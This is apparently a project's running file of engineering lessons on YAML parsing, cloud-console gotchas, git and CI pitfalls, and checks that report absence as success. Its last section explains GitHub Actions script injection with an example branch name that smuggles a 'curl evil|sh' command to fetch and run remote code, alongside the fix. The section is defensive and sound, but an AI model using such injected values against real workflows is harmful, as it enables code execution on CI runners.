# Learned

Durable facts worth knowing before starting work here. Append; do not rewrite history.

- **YAML frontmatter converts unquoted dates to `Date` objects.** `2026-07-01` arrives as a Date,
  not a string. `isoDate` in `src/pm/schema.ts` normalises both. Do not "fix" this by requiring
  quoted dates — hand-written frontmatter should stay natural.
- **A colon in an unquoted YAML value is a syntax error.** Titles routinely contain them. `pm new`
  quotes defensively; the parser reports the failure as an issue rather than throwing.
- **The parser must never throw on bad input.** `pm validate` is expected to report every problem
  in one run. Anything that can fail per-file returns a `ParseIssue` instead.
- **`morpheus init` is deliberately not built yet.** The first retrofit (MO-007, Evo) is its
  specification. Building it first would encode guesses about a structure no project has lived in.

- **Firebase's `addFirebase` returns `403 caller does not have permission` when the account has
  never accepted the Firebase Terms of Service.** It is not an IAM, scope, or org-policy problem,
  and the error names none of that. Accepting the terms once in the console — for any project —
  unblocks the API account-wide, after which the CLI works for every other project.

  Cost a long debugging session on 2026-07-29: chased OAuth scopes, `roles/firebase.admin`,
  domain-restricted-sharing, and automatic-IAM-grants policies, all of which were fine.
  **When a Google API returns a permission error that survives being Owner, check whether the
  product's terms have ever been accepted before touching IAM.**

- **`gcloud projects list` returns stale results for minutes** after a create or delete.
  `gcloud projects describe` is authoritative — do not use the list to confirm a mutation.

- **GCP project ids are globally unique**, so short generic names are always taken. Convention is
  an org prefix: `dh-darwin`, `dh-evo`. Display names must be **at least 4 characters**, and that
  failure is easily misread as "id taken".

- **Every abandoned Google Cloud create-project or trial flow leaves a junk project behind.**
  Seven accumulated in one session.

- **`git add -A` sweeps up whatever the editor left behind.** A 448 KB screenshot pasted into
  Nimbalyst landed in `hq/inbox/assets/` and was committed to a public repo without anyone
  choosing it. Images are now gitignored with an exception for `hq/brand/assets/`.

  **Screenshots belong in chat, not the repo.** An inbox archive does not need to be complete —
  the decisions distilled from it are what matter, and a binary in a text repo is permanent
  weight even after deletion.

  Prefer `git add <paths>` over `git add -A` when an editor with its own scratch state is in use.

- **Git does not track empty directories.** Scaffolding created with `mkdir` and no file in it
  ships missing and nobody notices until someone looks. Write a README into every directory the
  scaffold creates — it explains the directory *and* makes it exist.

- **`tsc` does not preserve the executable bit**, so `dist/cli/index.js` is unrunnable after every
  build even with a shebang. The build script chmods it. Symptom is `command not found` or
  `permission denied` from a `npm link`ed binary that clearly exists.

- **`gh pr merge --auto` can fire on a stale head.** Enabled on a PR whose checks were failing,
  it merged *without* a fix pushed afterwards — the roadmap item that PR added was silently lost
  from `main`.

  **Only enable auto-merge once the branch is complete.** Before that, `gh pr checks --watch`,
  fix, then set `--auto`. Auto-merge is a queue, not a promise to merge whatever arrives later.

- **`pnpm/action-setup` fails if both `version` and `packageManager` are specified.** Reusable
  workflows must leave `pnpm-version` empty so the lockfile-pinned `packageManager` wins.
  Evo never hit this because it lacks the field — the repo following the *stricter* practice is
  the one that broke.

- **Never hand-name a branch. Use `morpheus pm claim <ID>`.** It creates the branch *from* the
  item id, so they cannot disagree. Hand-naming produced a `check pr` failure twice in one
  session — the branch referenced an id that did not exist because the item had not been
  allocated yet.

- **Item files only hold ids that have merged.** An id another session has claimed exists solely
  as a remote branch until its PR lands, so anything reasoning about "which ids are taken" must
  ask `origin` as well as the disk. `pm new` did not, and would have re-issued MO-038 while a
  parallel session held it. `pm validate` catches the duplicate, but only after two sessions have
  each written a different item under one id.

  The general form: **on-disk state is the merged past, not the present.** Live state is on the
  remote.

- **Vercel project-scoped access is Enterprise-only.** Project-level roles can only be assigned to
  someone holding the **Contributor** team role, and Pro's RBAC is Owner, Member, Billing and Pro
  Viewer — Contributor is not among them. So on a Pro team every member sees every project, and
  "give this person one project" is not purchasable below Enterprise. The answer for a
  collaborator who must not see everything is **a separate team**, not a narrower role.

  Two things that soften it: **Pro Viewer seats are free** and can comment on preview deployments,
  which is the whole review loop Vercel was chosen for; and **Sharable Links** (Pro) bypass
  deployment protection for someone with no Vercel account at all.

  **Hobby has no team collaboration and is non-commercial only** under the fair-use guidelines, so
  anything commercial needs Pro regardless of who else needs access.

  Sources: [access roles](https://vercel.com/docs/rbac/access-roles),
  [managing team members](https://vercel.com/docs/rbac/managing-team-members),
  [Hobby plan](https://vercel.com/docs/plans/hobby).

## Never let an unanswerable question render as a confident answer

Three occurrences now, so it is a rule rather than a run of bad luck:

- GCP project ids reported as "taken" by grepping for `^ERROR`. The real error was a display name
  under four characters.
- `mergedPrs` must return `null` when `gh` is missing, not `[]`. "No merged PRs" is evidence; "gh
  is absent" is not, and collapsing them makes a missing tool look like a clean board.
- Onboarding detection returns `true | false | null`. A missing `gh` rendering as an unprotected
  branch sends someone to fix what was never broken.

The shape is always the same: a failure to determine something gets encoded as a determination.
When a check cannot run, say it did not run.

- **Borrowing a claim to carry unrelated work corrupts the board silently.** An inbox cycle had
  no roadmap item of its own, so PR #31 went out on `mo-010-simplify-architecture-md`. Merging
  released that claim and reconcile marked MO-010 **shipped with `prs: [31]`** — a PR that changed
  only `hq/inbox/` and `.agent/inbox-archive/`. Nobody had started the architecture work.

  The board being *ahead* of reality is worse than lagging it: a lagging board gets corrected on
  sight, and a shipped item is never looked at again.

  An audit of every shipped item against what its PR actually changed found two more: MO-015
  credited to PR #2 (a `learned.md` entry on `mo-015-empty-dirs`; the work was really PR #22) and
  MO-003 to PR #26, which is legitimate — that item's deliverable *was* the decision.

  **The first fix for this did not work, for an instructive reason.** It tested "did this PR
  change only `hq/inbox/` and `.agent/`", which is false for every real instance: a borrowed
  branch always carries board files too, because claiming reconciles statuses and `pm index`
  regenerates the tables into the same commit. The test has to be "changed nothing *but* records
  and board", which is a different question and needs its own predicate.

  **When a rule is written from a remembered example rather than the example's actual diff, it
  tends to describe a tidier version of the event than the one that happened.** Check the file
  list.

## A check that skips what is absent will report an empty thing as correct

Four instances in one day:

- `tokens.json` existing but empty read as a finished token system
- `goal` and `inbox` detectors checked for a filename, so an empty file passed
- `agents-md` checked that both paths exist, so two divergent real files passed where a symlink
  was required
- `checkDrift` skipped absent files, so a brand package that had never been generated reported as
  fully current

The shape is always the same: the loop says `if (!exists) continue`, which reads as "nothing to
compare" and renders as "nothing wrong". **When writing a check, ask what a false positive looks
like** — and specifically, what it reports when handed nothing at all.

Related but distinct from *never let an unanswerable question render as a confident answer*: there
the tool cannot determine the answer, here it can and treats absence as assent.

## A parser that fails silently deletes rows rather than reporting them

`listClaims` filtered branches through a regex and did `if (!m) continue`. When MO-057 changed the
id scheme and the pattern was not updated, every current branch stopped matching — so the function
returned an empty list from a remote full of claims, and reported no error at all.

The dangerous part is not the wrong output. It is that **absence is indistinguishable from
emptiness to every caller**. `pm claims` printed "No items are currently claimed", and the heartbeat
computed its ceiling, its blocked exclusion and its candidate list from the same empty list — all
three degrading at once, all three still "working".

Two things follow, and the second is the one that would have caught it:

1. **A skip in a parser is a decision, not a filter.** If a line cannot be parsed, either it is
   legitimately not a row (`main` is not a claim) or it is a row we failed to read — and those want
   different handling.
2. **Test the parse, not the pipeline.** The regex was welded to a `git for-each-ref` call, so
   nothing tested it and the whole suite passed against a parser returning nothing. The same file
   already had `parseClaimedNumbers` split out for exactly this reason; the lesson had been learned
   ten lines above and not applied.

Sibling of *a check that skips what is absent will report an empty thing as correct* — same shape,
one layer lower: there a check reads absence as assent, here a parser turns a failure into absence
first.

## Fixtures must use the identifiers actually in use

Every heartbeat test used `MO-001`. The scheme moved to `MO-26-08-01-17.28.41` in MO-057, and the
tests kept passing while the guards they cover had stopped working — because the legacy id was the
one shape the broken parser still handled.

**A fixture frozen at an old format tests the old format.** When an identifier scheme changes, the
fixtures are part of the migration, not incidental to it.

## A verifier that runs but cannot report looks exactly like one that found nothing

Agent review's first live run spent 20 turns and $0.86 producing a review, hit nine permission
denials trying to post it, and exited **green**. `agent-review / review  pass`.

MO-051 had guarded the obvious case — an *unconfigured* verifier must not report success, because a
green check is read as evidence — and the skip path does that correctly, with a job summary and a
warning annotation. What nobody considered was the case in between: configured, executing, and
mute. That state looks *healthier* than the skip, because the warning annotation is absent too.

The tell was in the timing, not the status: 3m48s where a skip took 20s. **When a step's cost
changes and its output does not, that gap is the finding.**

Generalising: for anything whose job is to *report*, "did it run" and "did its output arrive" are
two separate questions, and only the first one is usually instrumented. Ask what the check looks
like when the reporting path is broken — if the answer is "the same as success", the check is not
finished.

Sibling of *a check that skips what is absent will report an empty thing as correct*, one step
further out: there a check read absence as assent; here a check read its own silence as a clean bill
of health.

## Read a review to the end before acting on it

The agent review rung proposed a detector keyed on `permission_denials_count > 0`, then **retracted
it one pass later** in a "Smaller" note: denials are routinely non-zero on healthy runs, because
compound `Bash` commands are not in tag mode's allowlist. It said explicitly that whoever picked up
the item should take the delivery-based shape instead.

I had truncated that comment while reading it and stopped before the retraction, then wrote the
roadmap item around the withdrawn design. The next pass caught it, in the item rather than the code.

The reviewer was not wrong — it corrected itself unprompted. **Partial reading is how a superseded
recommendation gets implemented**, and it is far cheaper to make than to find. A review is a
document with a conclusion, not a list to skim for the first actionable line.

## Every push re-triggers a model-graded check, so the feedback loop is the bill

Rung 2 reviews on `pull_request`, which includes `synchronize` — so acting on a review and pushing
buys another review. That loop is the rung's whole value when it is reading code: two of the five
passes on #69 found defects in that PR's own guards, and neither would have surfaced without a
re-review.

It is also how $8.01 happened. **Four of seven runs read pushes that changed no code**, three of them
successive edits to one roadmap item's prose — the reviewer re-reading a paragraph at a dollar a
turn because the trigger cannot tell prose from code.

Worth internalising when wiring any paid check into CI: the cost is not per PR, it is per push, and
an agent that iterates diligently is the worst case. Gate on what the check can actually act on.

## A test can pass for a reason you did not write

`pathsMentioned` filtered URLs with `/^https?:/` and `path.includes("://")`. Both were **unreachable**
— the capture group was `[\w.-]` and `/`, which cannot contain a colon. The "ignores URLs" test
passed anyway, because the regex's *leading boundary class* refused to start a match at `//docs…`.

So one mechanism was quietly doing two jobs and the test proved neither. That mattered, because the
boundary class was also the bug: it omitted `*`, so bold paths — the most common citation form —
were silently missed. Widening it to fix that would have started leaking URLs through a guard that
looked like it handled them.

**When a test passes, know which line made it pass.** A guard that has never executed is not a
guard, and it hides the real mechanism from the next person to change it — including from the tests
that are supposed to protect it.

## `${{ }}` in a `run:` block is string substitution, not a variable

GitHub Actions expands `${{ }}` into the script text *before* bash parses it. So
`--branch=${{ github.head_ref }}` with a branch named `x";curl evil|sh;"` executes the curl.

`github.head_ref`, PR titles and PR bodies are all attacker-controlled on a fork pull request, and
this repo is public with an external-contributor flow — a live surface, not a theoretical one.

**Pass them through `env:` and quote them.** There the value reaches bash as data and never becomes
part of the script.

The test for this must parse the YAML rather than slice the text: an `env:` block sits directly
above the `run:` it feeds, so any text-splitting heuristic sees them as one chunk and flags the safe
form as unsafe. `step.run` is exactly the shell that executes and nothing else.
